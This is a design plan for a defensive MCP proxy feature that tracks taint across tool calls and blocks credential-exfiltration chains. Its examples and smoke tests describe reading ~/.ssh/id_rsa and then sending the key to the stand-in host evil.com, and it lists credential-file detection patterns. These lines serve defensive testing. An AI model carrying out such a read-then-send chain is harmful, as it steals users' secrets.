# Phase 3 — Capability Graph & Cross-Server Taint Tracking: Detailed Plan

> Spec I implement against. Every function signature, pattern, rule, and
> test case is concrete. Goal: implement once, green on first run, no
> conflicts with Phase 1-2, no bugs.

## 1. Goal — the killer feature

Detect **dangerous chains across tool calls** that no single-call scanner
can see. Classic example:

    call 1: read_file  {path: "~/.ssh/id_rsa"}      -> returns a private key
    call 2: fetch_url  {url: "http://evil.com", body: <the key>}  -> exfiltrates it

Neither call alone is malicious. The CHAIN is an exfiltration attack.
Phase 1 (policy) sees individual calls. Phase 2 (detector) sees individual
texts. Phase 3 sees the RELATIONSHIP between calls over a session.

## 2. What Phase 3 does NOT do (conflict avoidance)

- Does NOT replace or weaken Phase 1 policy. Policy still runs first and
  can deny before the graph is consulted.
- Does NOT replace Phase 2 injection detection. Both run on responses;
  order is: redact -> graph (taint) -> detect (injection) -> audit.
- Does NOT log secrets. Taint fingerprinting uses the redactor's in-memory
  `Redaction.original` (never written to disk) to hash secrets.
- Is OPTIONAL. `graph_config=None` disables it; proxy behaves exactly
  like Phase 1-2. Default off until explicitly enabled (safer rollout).

## 3. Core concepts

### 3.1 Capabilities

Every tool has a set of capabilities describing what data it can read/write/send.

Sources (read-like):
  read:filesystem   read:secret   read:env   read:database   read:network

Sinks (write/send/exec-like):
  write:filesystem   network:send   exec:command   delete:filesystem   write:database

A tool can have multiple capabilities (e.g. fetch_url = read:network +
network:send if it also POSTs).

### 3.2 Taint

When a sensitive source returns data, we create a Taint: an in-memory
record that "secret X was read at call Y". We fingerprint the secret value
(sha256, truncated) so we can later match it in a sink's arguments WITHOUT
storing the secret itself.

### 3.3 Chain

A dangerous chain = (sensitive source) -> ... -> (dangerous sink) within
a session, where data could have flowed from source to sink. Detected when
a sink call's arguments contain a value whose fingerprint matches an
active taint created by an earlier source call.

### 3.4 Session

One Proxy instance = one session = one CapabilityGraph. The graph is reset
on a new `initialize` request (start of a new agent session). Taints persist
across calls within the session (with TTL + max count to bound memory).

## 4. Data structures (graph/types.py)

```python
@dataclass
class Taint:
    taint_id: str            # uuid4 hex
    source_call_id: int | str
    source_tool: str
    label: str               # "secret:ssh_key", "env", "file:~/.ssh", ...
    fingerprint: str         # sha256(value)[:16] (64-bit, in memory only)
    created_at: float        # time.time()

@dataclass
class Chain:
    source_call_id: int | str
    source_tool: str
    sink_call_id: int | str
    sink_tool: str
    label: str               # the taint label that matched
    sink_capability: str    # e.g. "network:send"
    rule_name: str           # which chain rule fired

@dataclass
class ChainRule:
    name: str
    source_capability: str   # e.g. "read:secret"
    sink_capability: str     # e.g. "network:send"
    severity: str            # "block" | "review"

@dataclass
class GraphConfig:
    enabled: bool = True
    max_taints: int = 1000       # LRU eviction above this
    taint_ttl_seconds: float = 1800.0  # 30 min
    fingerprint_size: int = 16    # chars of sha256
    max_arg_scan_chars: int = 50_000  # don't fingerprint huge args
    # Override the built-in capability registry
    extra_capabilities: dict[str, list[str]] | None = None
    # Override the built-in chain rules
    extra_rules: list[ChainRule] | None = None
```

## 5. Capabilities (graph/capabilities.py)

### 5.1 Static registry (built-in, well-known MCP servers)

```python
TOOL_CAPABILITIES: dict[str, list[str]] = {
    # filesystem server
    "read_file": ["read:filesystem"],
    "read_text_file": ["read:filesystem"],
    "write_file": ["write:filesystem"],
    "list_directory": ["read:filesystem"],
    "create_directory": ["write:filesystem"],
    "delete_file": ["delete:filesystem"],
    "move_file": ["write:filesystem"],
    "search_files": ["read:filesystem"],
    # fetch server
    "fetch_url": ["read:network"],
    "http_request": ["read:network", "network:send"],
    "post_url": ["network:send"],
    # git server
    "git_status": ["read:filesystem"],
    "git_run": ["read:filesystem", "exec:command"],
    # shell/exec servers
    "exec": ["exec:command"],
    "run_command": ["exec:command"],
    "execute": ["exec:command"],
    "shell": ["exec:command"],
    # database servers
    "sql_query": ["read:database"],
    "sql_execute": ["read:database", "write:database"],
    "read_query": ["read:database"],
    "write_query": ["write:database"],
    # env
    "get_env": ["read:env"],
    "list_env": ["read:env"],
}
```

### 5.2 Capability inference from tool description

When a tool isn't in the static registry, infer capabilities from its
description (on tools/list). Conservative keyword matching:

```python
_INFER_PATTERNS = [
    (r"\b(read|get|load|fetch|retrieve|list)\b.*\b(file|path|directory|folder)\b", "read:filesystem"),
    (r"\b(write|save|create|update|modify|delete|remove)\b.*\b(file|path|directory)\b", "write:filesystem"),
    (r"\b(fetch|get|request|http|url|curl)\b", "read:network"),
    (r"\b(post|send|upload|submit|webhook)\b", "network:send"),
    (r"\b(exec|execute|run|shell|bash|cmd|command|subprocess)\b", "exec:command"),
    (r"\b(env|environment variable)\b", "read:env"),
    (r"\b(sql|query|database|db)\b.*\b(select|read)\b", "read:database"),
    (r"\b(sql|query|database|db)\b.*\b(insert|update|delete|drop|write)\b", "write:database"),
]
```

Inference only ADDS capabilities; it never assigns `read:secret` (that's
determined by source detection on the actual call args, not the description).
Inference is overridden by the static registry (registry wins on conflict).

```python
def get_capabilities(tool_name: str, description: str = "",
                     registry: dict | None = None) -> list[str]:
    """Return capabilities for a tool. Registry first, then inference."""
```

## 6. Sensitive source detection (graph/sources.py)

A call is a "sensitive source" if its capability is a read-type AND its
arguments match a sensitive pattern. We detect two kinds:

### 6.1 Sensitive file paths (request args)

```python
SENSITIVE_PATH_PATTERNS = [
    (r"~/\.ssh/(id_rsa|id_ed25519|id_ecdsa|id_dsa|config|authorized_keys)", "secret:ssh_key"),
    (r"~/\.aws/credentials", "secret:aws_creds"),
    (r"~/\.aws/config", "secret:aws_config"),
    (r"~/\.env(\.local|\.production|\.development)?$", "secret:env_file"),
    (r"~/\.netrc", "secret:netrc"),
    (r"~/\.npmrc", "secret:npmrc"),
    (r"~/\.pypirc", "secret:pypirc"),
    (r"~/\.config/([^/]+/)?credentials", "secret:cloud_creds"),
    (r"~/\.docker/config\.json", "secret:docker_creds"),
    (r"~/\.kube/config", "secret:kube_creds"),
    (r"/etc/(passwd|shadow|gshadow)", "secret:system_file"),
    (r".*\.pem$", "secret:pem_key"),
    (r".*\.key$", "secret:key_file"),
]
```

### 6.2 Secret content in response (via redactor)

When the redactor masks a secret in a read response, that means a credential
was returned. We use the redactor's in-memory `Redaction.original` to
fingerprint it. This is the elegant hook: NO new secret scanning, reuse
Phase 1's redactor output.

### 6.3 Env-var-like content

Even without a known secret format, a read response that looks like
`KEY=value` lines with secret-ish keys is suspicious:

```python
ENV_VAR_RE = re.compile(r"(?m)^\s*([A-Z_][A-Z0-9_]*)\s*=\s*(\S.{8,})\s*$")
SECRET_KEY_NAMES = re.compile(r"(PASSWORD|SECRET|TOKEN|API_KEY|PRIVATE_KEY|CREDENTIAL)")
```

If a read response has env-var lines AND the key name matches
SECRET_KEY_NAMES -> create a taint with label "env:<name>".

### 6.4 Function signatures

```python
def is_sensitive_source(tool: str, args: dict, capabilities: list[str]) -> tuple[bool, str]:
    """Return (is_sensitive, label). label is the taint label or ''."""

def extract_sensitive_values_from_response(redactions: list, response_text: str)
    -> list[tuple[str, str]]:
    """Return [(label, value)] of sensitive values found in the response.
    Uses redactor redactions (in-memory originals) + env-var scan."""

def fingerprint(value: str, size: int = 16) -> str:
    """sha256(value)[:size]. In-memory only; never logged."""
```

## 7. Chain rules (graph/rules.py)

### 7.1 Dangerous chains (built-in)

```python
DANGEROUS_CHAINS: list[ChainRule] = [
    ChainRule("secret-exfiltration", "read:secret", "network:send", "block"),
    ChainRule("env-exfiltration", "read:env", "network:send", "block"),
    ChainRule("secret-to-exec", "read:secret", "exec:command", "block"),
    ChainRule("env-to-exec", "read:env", "exec:command", "block"),
    ChainRule("file-to-exec", "read:filesystem", "exec:command", "review"),
    ChainRule("secret-to-write", "read:secret", "write:filesystem", "review"),
    ChainRule("db-to-exfiltration", "read:database", "network:send", "block"),
    ChainRule("network-to-exec", "read:network", "exec:command", "review"),
]
```

"block" rules deny the sink call (ERR_CHAIN_BLOCKED). "review" rules log
but allow (future: route to approval flow).

### 7.2 Matching

```python
def is_dangerous_chain(source_caps: list[str], sink_caps: list[str],
                       rules: list[ChainRule]) -> ChainRule | None:
    """Return the first matching rule (source cap in source_caps,
    sink cap in sink_caps), or None."""
```

A chain is confirmed when:
1. The sink call's capability matches a rule's sink_capability, AND
2. The sink call's arguments contain a value whose fingerprint matches an
   active taint whose source capability matches the rule's source_capability.

## 8. The CapabilityGraph (graph/graph.py)

```python
class CapabilityGraph:
    def __init__(self, config: GraphConfig):
        self.config = config
        self._tool_caps: dict[str, list[str]] = {}  # tool name -> caps
        self._taints: dict[str, Taint] = {}  # fingerprint -> Taint (dedup by fp)
        self._taint_order: list[str] = []   # for LRU eviction
        self._chains: list[Chain] = []

    def register_tool(self, name, description=""):
        """Register a tool's capabilities (from tools/list)."""

    def reset(self):
        """Clear all state (new session)."""

    def check_sink(self, call_id, tool, args) -> tuple[Decision, Chain | None]:
        """Called on a tools/call REQUEST. If this call is a dangerous sink
        and its args match an active taint, return (deny, chain).
        Otherwise return (allow, None)."""

    def record_source(self, call_id, tool, args, redactions, response_text):
        """Called on a tools/call RESPONSE. If this call was a sensitive
        source, create taints from the response (redactions + env scan)."""

    def _evict(self):
        """LRU eviction + TTL expiry to bound memory."""

    def _add_taint(self, taint):
        """Dedup by fingerprint; enforce max_taints."""
```

### 8.1 check_sink algorithm

```
1. caps = self._tool_caps.get(tool, infer)
2. if no caps: return (allow, None)  # unknown tool, fail-open
3. sink_caps = [c for c in caps if c in SINK_CAPABILITIES]
4. if not sink_caps: return (allow, None)  # not a sink
5. for each rule in DANGEROUS_CHAINS where rule.sink_capability in sink_caps:
6.   for each taint in self._taints.values():
7.     if taint source capability matches rule.source_capability:
8.       if any arg value fingerprint matches taint.fingerprint:
9.         chain = Chain(...); return (deny, chain)
10. return (allow, None)
```

### 8.2 record_source algorithm

```
1. caps = self._tool_caps.get(tool, infer)
2. is_sensitive, path_label = is_sensitive_source(tool, args, caps)
3. sensitive_values = extract_sensitive_values_from_response(redactions, response_text)
4. if is_sensitive (path-based) and caps include a read capability:
5.     # The path itself is sensitive; taint any secret-like content in response.
6. for (label, value) in sensitive_values:
7.     fp = fingerprint(value)
8.     if fp not in self._taints:
9.         self._add_taint(Taint(..., label, fp, ...))
10. evict expired/LRU taints
```

## 9. Integration into proxy.py (NO conflict with Phase 1-2)

### 9.1 ProxyConfig

Add:
```python
graph_config: Optional[GraphConfig] = None  # None = graph disabled
```

### 9.2 Proxy.__init__

```python
self.graph = CapabilityGraph(config.graph_config) if config.graph_config else None
```

### 9.3 Pipeline order (the critical non-conflict design)

Request side (_inspect_request), AFTER redaction, AFTER policy:
```
redact args -> policy -> [graph.check_sink] -> forward
```
If graph.check_sink denies -> return deny (ERR_CHAIN_BLOCKED). This runs
AFTER policy, so policy still has first say. Graph only adds a NEW deny
reason; it never overrides an allow from policy when policy already denied.

Response side (_inspect_response), AFTER redaction, BEFORE injection detect:
```
redact response (get redactions) -> [graph.record_source] -> detect injection -> audit
```
record_source uses the redactions (in-memory originals) to fingerprint.
It runs BEFORE injection detect but does NOT modify the response, so
injection detection sees the same (redacted) text. No conflict.

### 9.4 tools/list response

In _inspect_response, when req.method == "tools/list": call
`self.graph.register_tool(name, description)` for each tool in the
response. This populates the capability registry. Runs before any
tools/call so caps are known when calls arrive.

### 9.5 Carrying call state (request -> response)

The proxy's _pump processes request then response sequentially. We need
to know, when the response arrives, whether the request was a sensitive
source. Solution: _inspect_request returns the (decision, processed) as
today, AND we stash a "call context" on the processed message:
```python
processed._call_ctx = {"call_id": req.id, "tool": tool, "args": arguments}
```
_inspect_response reads `getattr(req, "_call_ctx", None)` (the REQUEST's
context) to pass to graph.record_source. Since _pump has both req and resp
in scope, we pass req to _inspect_response (already done).

### 9.6 New error code

protocol.py already has ERR_CHAIN_BLOCKED = -32004 (defined in Phase 1).
Use it for graph denies.

### 9.7 Audit enrichment

Add `chain` field to audit entries when a chain was detected:
```python
chain = {"source_call": c.source_call_id, "source_tool": c.source_tool,
         "sink_call": c.sink_call_id, "sink_tool": c.sink_tool,
         "label": c.label, "rule": c.rule_name}
```
Pass to audit.log(...) as detection=chain (reuse the detection field).

### 9.8 Session reset

On `initialize` request in _inspect_request: if self.graph: self.graph.reset().
This starts a fresh taint set for a new agent session.

## 10. Edge cases & bug-prevention (the critical list)

1. **False positives (benign read then benign send)**
   -> Only flag when sink is network:send to EXTERNAL url or exec:command.
   Tunable: "review" severity for weaker signals, "block" for clear exfil.

2. **Taint explosion (memory growth)**
   -> max_taints=1000 with LRU eviction + TTL=1800s. Dedup by fingerprint.

3. **Fingerprint collisions**
   -> sha256[:16] = 64 bits. Collision probability negligible at
   session scale (1000s of taints). Documented limitation.

4. **Secret already redacted before graph sees it**
   -> Use redactor's in-memory Redaction.original (never logged).
   graph imports nothing about logging; it only fingerprints in memory.

5. **Multi-call gap (read at call 1, send at call 50)**
   -> Taints persist for TTL (30 min) across the whole session.

6. **Same secret read twice**
   -> Dedup by fingerprint: second read does not create a new taint.

7. **Graph must not crash proxy**
   -> Every graph method wrapped in try/except in the proxy hooks.
   On error: log warning + allow (fail-open; policy+detector still ran).

8. **Capability inference false positives**
   -> Static registry wins. Inference only ADDS caps, never assigns
   read:secret (that's source-detection's job on actual args). Inference
   is conservative (requires both verb+noun keywords).

9. **No tools/list seen before tools/call**
   -> Fall back to static registry by tool name. If unknown tool,
   assume no dangerous capability (fail-open). Document.

10. **Large arguments (fingerprinting huge args is slow)**
    -> Only fingerprint arg values up to max_arg_scan_chars (50KB).
    Skip non-string args. Chunk long strings.

11. **Thread safety**
    -> Graph is NOT thread-safe. Proxy is sequential (Phase 1-3).
    Document: one graph per proxy instance.

12. **Test isolation**
    -> Each test creates a fresh CapabilityGraph. No module-level state.
    Use tmp_path for any file-based tests.

13. **Graph disabled (config=None)**
    -> Proxy behaves EXACTLY like Phase 1-2. All existing tests pass
    unchanged. Verify with the full suite after integration.

14. **Order with redactor**
    -> record_source takes the redactions list (from the redactor run on
    the same response). The redactor already ran in _inspect_response
    before record_source. We reuse its output; we do NOT re-scan.

15. **Fingerprinting non-secret content**
    -> Only fingerprint values that matched a sensitive pattern (path
    regex, redactor redaction, or env-var-with-secret-name). Never
    fingerprint arbitrary response text.

16. **Circular dependency**
    -> graph imports NOTHING from protocol/proxy. It's pure
    (tool, args, redactions, text) -> (decision, chain). _extract helpers
    stay in proxy.py. types.py is imported by graph modules only.

17. **Chain detection on the SAME call (read+send in one tool)**
    -> A tool with both read:secret and network:send (e.g. a "fetch and
    forward" tool) could exfil in one call. check_sink runs on the
    REQUEST (before forward) so it can't see the response yet. For
    same-call chains, record_source creates the taint AFTER the response,
    too late to block THIS call. Mitigation: document as a limitation;
    Phase 1 policy (block_internal) + Phase 2 detector catch most of
    these. Future: a post-response chain check that flags for review.

## 11. Test plan (concrete cases)

### 11.1 test_capabilities.py

| Case | Input | Expected |
|---|---|---|
| registry_known | read_file | ["read:filesystem"] |
| registry_unknown_infer | "my_reader" + desc "read a file from disk" | ["read:filesystem"] |
| infer_network | "my_fetcher" + desc "fetch a URL" | ["read:network"] |
| infer_exec | "runner" + desc "execute a shell command" | ["exec:command"] |
| registry_overrides_inference | "read_file" + desc "execute commands" | ["read:filesystem"] (registry wins) |
| no_match | "x" + desc "does nothing" | [] |

### 11.2 test_sources.py

| Case | Input | Expected |
|---|---|---|
| ssh_key_path | "~/.ssh/id_rsa" | (True, "secret:ssh_key") |
| aws_creds_path | "~/.aws/credentials" | (True, "secret:aws_creds") |
| benign_path | "/tmp/report.txt" | (False, "") |
| pem_file | "/keys/server.pem" | (True, "secret:pem_key") |
| env_var_secret | response "API_KEY=sk-abc123def456" | taint "env:API_KEY" |
| env_var_benign | response "PATH=/usr/bin" | no taint (PATH not secret-ish) |
| fingerprint_stable | "abc" | sha256("abc")[:16] |
| fingerprint_different | "abc" vs "abd" | different fingerprints |

### 11.3 test_rules.py

| Case | source_caps | sink_caps | Expected rule |
|---|---|---|---|
| secret_exfil | [read:secret] | [network:send] | secret-exfiltration (block) |
| env_exec | [read:env] | [exec:command] | env-to-exec (block) |
| benign | [read:filesystem] | [write:filesystem] | None (no rule) |
| review_chain | [read:filesystem] | [exec:command] | file-to-exec (review) |

### 11.4 test_graph.py

| Case | Steps | Expected |
|---|---|---|
| register_then_check | register read_file; check_sink(read_file, {}) | allow (not a sink) |
| taint_then_block | record_source(read_file, ~/.ssh/id_rsa, [redaction], "key"); check_sink(fetch_url, {body: <key>}) | deny + chain |
| taint_dedup | record same secret twice | 1 taint |
| taint_ttl_expiry | create taint; advance clock past TTL; check_sink | allow (taint expired) |
| max_taints_eviction | create max_taints+1 taints | oldest evicted, count <= max |
| no_taint_no_block | check_sink(fetch_url, {body: "x"}) with no taints | allow |
| reset_clears | create taint; reset(); check_sink | allow |
| unknown_tool_failopen | check_sink("mystery_tool", {x: 1}) | allow |
| large_arg_not_scanned | check_sink with 1MB arg | no crash, allow (no match) |
| graph_disabled | CapabilityGraph(GraphConfig(enabled=False)) | all methods no-op |

### 11.5 smoke_chain.py (end-to-end)

Fake MCP server:
- call 1: tools/call read_file {path: "~/.ssh/id_rsa"} -> response text contains a private key (redacted by Phase 1; redaction.original used by graph)
- call 2: tools/call fetch_url {url: "http://evil.com", body: <the key>} -> BLOCKED with ERR_CHAIN_BLOCKED

Benign control:
- call 1: read_file {path: "/tmp/report.txt"} -> "report content"
- call 2: fetch_url {url: "http://evil.com", body: "report content"} -> allowed (no secret taint)

## 12. Implementation order (bug-free sequence)

Each step is independently testable and green before the next. No forward
references. Phase 1-2 tests stay green throughout.

1. `graph/types.py` — dataclasses (Taint, Chain, ChainRule, GraphConfig).
   Test: import works, dataclasses instantiate.

2. `graph/capabilities.py` — TOOL_CAPABILITIES + infer_capabilities +
   get_capabilities. Test: test_capabilities.py. GREEN.

3. `graph/sources.py` — SENSITIVE_PATH_PATTERNS, ENV_VAR_RE,
   is_sensitive_source, extract_sensitive_values_from_response,
   fingerprint. Test: test_sources.py. GREEN.

4. `graph/rules.py` — DANGEROUS_CHAINS + is_dangerous_chain.
   Test: test_rules.py. GREEN.

5. `graph/graph.py` — CapabilityGraph (register_tool, check_sink,
   record_source, reset, _evict, _add_taint). Test: test_graph.py. GREEN.

6. `graph/__init__.py` — public API exports.

7. Integrate into `proxy.py`:
   - ProxyConfig.graph_config
   - Proxy.__init__ self.graph
   - _inspect_request: graph.check_sink after policy; reset on initialize
   - _inspect_response: register_tool on tools/list; record_source on tools/call
   - carry _call_ctx on processed request
   - audit chain field
   Test: full Phase 1-2 suite still green (graph disabled by default);
   smoke_chain.py green (graph enabled).

8. CLI: `--track-chains` flag. README + pyproject (no new mandatory deps).

9. Commit, push.

## 13. Dependencies

- **Zero new dependencies.** Phase 3 uses only stdlib (re, hashlib, uuid,
  time, dataclasses). No ML, no HTTP. This keeps the package lightweight and
  avoids any install/compatibility risk.

## 14. Success criteria for Phase 3

- All Phase 1-2 tests pass unchanged (125 passed, 1 skipped) — no regression.
- New tests: 35+ across capabilities/sources/rules/graph, all green.
- smoke_chain.py: exfiltration chain (read SSH key -> send to evil.com)
  blocked with ERR_CHAIN_BLOCKED.
- smoke_chain.py: benign read+send allowed (no false positive).
- Graph disabled (config=None) -> proxy behaves exactly like Phase 1-2.
- No new mandatory dependencies.
- Audit log includes chain field when a chain was detected.
- Graph never crashes the proxy (try/except on all hooks).
- Memory bounded (max_taints + TTL).

## 15. File structure

```
mcp_shield/
  graph/
    __init__.py        # public API: CapabilityGraph, Taint, Chain, GraphConfig
    types.py           # Taint, Chain, ChainRule, GraphConfig
    capabilities.py   # TOOL_CAPABILITIES + infer_capabilities
    sources.py         # sensitive source detection + fingerprint
    rules.py           # DANGEROUS_CHAINS + is_dangerous_chain
    graph.py           # CapabilityGraph (the stateful combiner)
```

No changes to Phase 1-2 files except `proxy.py` (integration), `cli.py`
(flag), `audit.py` (chain field reuse detection field), `README.md`,
`pyproject.toml` (no new deps; maybe document graph as built-in).
